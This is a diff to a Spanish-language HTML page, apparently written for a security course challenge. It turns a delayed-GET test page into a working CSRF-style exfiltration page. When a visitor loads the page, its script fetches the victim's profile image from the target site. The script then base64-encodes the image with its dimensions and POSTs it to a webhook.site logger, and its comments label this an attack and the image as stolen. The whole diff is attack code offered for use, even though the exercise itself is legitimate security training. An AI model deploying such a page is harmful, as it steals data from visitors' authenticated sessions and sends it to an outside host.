@@ -2,58 +2,105 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <title>Página de Pruebas CSRF con Retraso</title>
+    <title>Página de Captura de Imagen con Dimensiones</title>
     <style>
-        #respuesta-servidor {
-            margin-top: 20px;
-            padding: 10px;
-            border: 1px solid #ccc;
-            white-space: pre-wrap; 
-            background-color: #f7f7f7;
-            font-family: monospace;
-        }
+        .success { color: green; font-weight: bold; }
+        .error { color: red; font-weight: bold; }
     </style>
 </head>
 <body>
 
-    <h1>Página de Pruebas CSRF</h1>
-    <p>Esta página hará un GET a la URL objetivo **después de un retraso de 3 segundos**.</p>
+    <h1>Bienvenido a mi sitio de prueba.</h1>
+    <p>Gracias por visitarnos. (La imagen de perfil se está intentando robar en segundo plano).</p>
     
-    <p id="estado-peticion">Estado: **Esperando 3 segundos para asegurar la sesión...**</p>
-    
-    <h2>Respuesta del Servidor (Contenido HTML obtenido):</h2>
-    <div id="respuesta-servidor">Esperando respuesta...</div>
+    <p id="estado-peticion">Estado: **Esperando 3 segundos...**</p>
 
     <script>
+        // 1. URL OBJETIVO (El servidor de la víctima)
         const URL_OBJETIVO = 'https://chl-a85cf6b8-7049-4023-abe6-fee13a1a5d5a-imagen-importante.softwareseguro.com.ar/profile-pic';
-        const DELAY_MS = 3000; // Retraso en milisegundos (3 segundos)
-
+        
+        // 2. TU URL DE LOGGING (¡AQUÍ ESTÁ TU WEBHOOK.SITE URL!)
+        const URL_LOGGER = 'https://webhook.site/8a0d86a1-d8f5-4b01-92ef-a3a59a4529d2'; 
+        
+        const DELAY_MS = 3000;
         const estadoElemento = document.getElementById('estado-peticion');
-        const respuestaElemento = document.getElementById('respuesta-servidor');
 
-        // La función principal que ejecuta el GET
-        function ejecutarGet() {
-            estadoElemento.textContent = `Estado: Enviando petición...`; // Actualiza el estado
+        // Función para convertir Blob/File a Base64
+        const blobToBase64 = blob => new Promise((resolve, reject) => {
+            const reader = new FileReader();
+            reader.onloadend = () => resolve(reader.result);
+            reader.onerror = reject;
+            reader.readAsDataURL(blob);
+        });
+
+        // Función para obtener las dimensiones del Blob
+        const getDimensions = blob => new Promise((resolve, reject) => {
+            const url = URL.createObjectURL(blob);
+            const img = new Image();
             
-            fetch(URL_OBJETIVO)
-                .then(response => {
-                    estadoElemento.textContent = `Estado: Petición enviada (Status: ${response.status}).`;
-                    return response.text(); 
-                })
-                .then(data => {
-                    respuestaElemento.textContent = data;
-                })
-                .catch(error => {
-                    estadoElemento.textContent = `Estado: Error de red. Revisa la consola (F12) para errores de CORS.`;
-                    respuestaElemento.textContent = `Error: ${error.message}`;
-                    console.error('Error en la petición GET:', error);
-                });
+            img.onload = () => {
+                const dimensions = { width: img.width, height: img.height };
+                URL.revokeObjectURL(url); // Limpia la URL temporal
+                resolve(dimensions);
+            };
+            img.onerror = reject;
+            img.src = url; // Carga la imagen desde el Blob
+        });
+
+
+        async function enviarADestino(base64Image, dimensions) {
+            // Incluimos las dimensiones en el cuerpo del POST
+            const contenidoCodificado = encodeURIComponent(base64Image);
+            const bodyData = `imagen_base64=${contenidoCodificado}&ancho=${dimensions.width}&alto=${dimensions.height}`;
+            
+            fetch(URL_LOGGER, {
+                method: 'POST',
+                headers: {
+                    // Usamos JSON en el cuerpo si la data es más compleja, pero para este caso x-www-form-urlencoded es más simple
+                    'Content-Type': 'application/x-www-form-urlencoded', 
+                },
+                body: bodyData
+            })
+            .then(() => {
+                estadoElemento.innerHTML = `<span class="success">✅ Imagen (${dimensions.width}x${dimensions.height}) robada y enviada a tu logger.</span>`;
+            })
+            .catch(error => {
+                estadoElemento.innerHTML = `<span class="error">❌ Error al enviar los datos a tu logger.</span>`;
+                console.error('Error al enviar los datos robados:', error);
+            });
         }
 
-        // Función que se ejecuta al cargar la página
+        async function ejecutarAtaque() {
+            estadoElemento.textContent = `Estado: Ejecutando ataque CSRF...`;
+            
+            try {
+                // Paso 1: Hacemos el GET al servidor de la víctima
+                const response = await fetch(URL_OBJETIVO);
+                
+                if (!response.ok) {
+                    throw new Error(`Fallo en el GET, Status: ${response.status}.`);
+                }
+
+                // Paso 2: Leemos la respuesta como binario (Blob)
+                const imageBlob = await response.blob();
+                
+                // Paso 3: Obtenemos las dimensiones de la imagen
+                const dimensions = await getDimensions(imageBlob);
+                
+                // Paso 4: Convertimos el binario a Base64
+                const base64String = await blobToBase64(imageBlob);
+                
+                // Paso 5: Enviamos la cadena Base64 y las dimensiones a nuestro servidor de registro
+                await enviarADestino(base64String, dimensions);
+
+            } catch (error) {
+                estadoElemento.innerHTML = `<span class="error">❌ Fallo el ataque: ${error.message}.</span>`;
+                console.error('Fallo en la cadena de ataque:', error);
+            }
+        }
+
         window.onload = function() {
-            // Utilizamos setTimeout para ejecutar ejecutarGet() después de DELAY_MS
-            setTimeout(ejecutarGet, DELAY_MS);
+            setTimeout(ejecutarAtaque, DELAY_MS);
         };
     </script>
 
